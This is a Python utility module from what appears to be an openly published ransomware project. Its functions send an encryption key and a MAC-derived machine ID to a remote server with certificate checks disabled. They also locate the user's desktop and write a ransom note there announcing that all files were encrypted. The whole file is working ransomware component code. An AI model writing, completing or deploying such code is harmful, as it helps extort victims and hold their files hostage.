#  _   _  _____     ____  __ ____ _____ ____
# | \ | |/ _ \ \   / /  \/  | __ )___ /|  _ \
# |  \| | | | \ \ / /| |\/| |  _ \ |_ \| |_) |
# | |\  | |_| |\ V / | |  | | |_) |__) |  _ <
# |_| \_|\___/  \_/  |_|  |_|____/____/|_| \_\
#
# Copyright (c) 2024-2025 Daniel Lima
#
# Licensed under the MIT License.
# See the LICENSE file in the project root for full license text.
"""Utility functions for machine ID generation, key transmission, and desktop warnings."""

import os
import platform
import uuid
from pathlib import Path
from uuid import UUID

import requests


def send_key(url: str, key: bytes, machine_id: str) -> None:
    """
    Sends the encryption key and machine ID to a remote server.

    Args:
        url (str): The endpoint to which the data will be sent.
        key (bytes): The encryption key to send.
        machine_id (str): The unique identifier for the machine.
    """
    payload = {"key": key.decode(), "machine_id": machine_id}
    try:
        response = requests.post(url, json=payload, verify=False)
        if response.status_code != 200:
            print(
                f"Failed to send key.\nStatus: {response.status_code} | {response.text}"
            )
        else:
            print("Key sent succesfully.")
    except requests.RequestException as e:
        print(f"Error while sending key: {e}")


def gen_machine_id(ns: UUID = uuid.NAMESPACE_DNS) -> str:
    """
    Generates a machine-specific UUID based on the MAC address.

    Args:
        ns (UUID, optional): The namespace used to generate the UUID.
            Defaults to uuid.NAMESPACE_DNS.

    Returns:
        str: A UUID string representing the machine ID.
    """
    mac = uuid.getnode()
    return str(uuid.uuid5(ns, str(mac)))


def get_desktop_path() -> Path:
    """
    Retrieves the path to the user's desktop directory.

    Returns:
        Path: Path object pointing to the user's desktop.
    """
    system = platform.system()
    if system == "Windows":
        desktop = Path(os.environ["USERPROFILE"]) / "Desktop"
    else:  # Unix / Mac
        desktop = Path.home() / "Desktop"
    return desktop


def save_warning_text(machine_id: str, filename: str = "READ_ME.txt") -> None:
    """Saves a warning file with the machine ID on the desktop.

    Args:
        machine_id (str): The unique identifier for the machine.
        filename (str, optional): Name of the warning file. Defaults to "READ_ME.txt".
    """
    desktop_path = get_desktop_path()
    path = desktop_path / filename
    content = [
        "DON'T DELETE THIS FILE!",
        f"MachineId: {machine_id}",
        "---------------------------------------------",
        "Your computer was invaded by a ransomware",
        "and all files were encrypted.",
        "---------------------------------------------",
        "*Note that, if you lose your machine id, you",
        "won't be able to decrypt your files.",
    ]
    Path(path).write_text("\n".join(content), encoding="utf-8")
    print(f"Warning file saved at: {path}")
